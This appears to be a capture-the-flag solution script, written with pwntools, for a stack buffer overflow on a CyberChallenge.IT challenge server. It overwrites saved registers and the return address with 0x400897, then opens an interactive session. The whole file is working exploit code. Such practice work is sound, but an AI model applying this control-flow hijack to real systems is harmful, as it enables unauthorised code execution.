from pwn import *

payload =  b'A'*1032	# 1024 Bytes of buffer + 8 allocated by compiler
payload += b'B'*8		# 8 Bytes for rbx register
payload += b'C'*8		# 8 Bytes from rbp register
payload += p64(0x0000000000400897)		# Address to jump to

p = remote('1996.challs.cyberchallenge.it', '9121')

p.sendafter(b'? ', payload)
p.interactive()

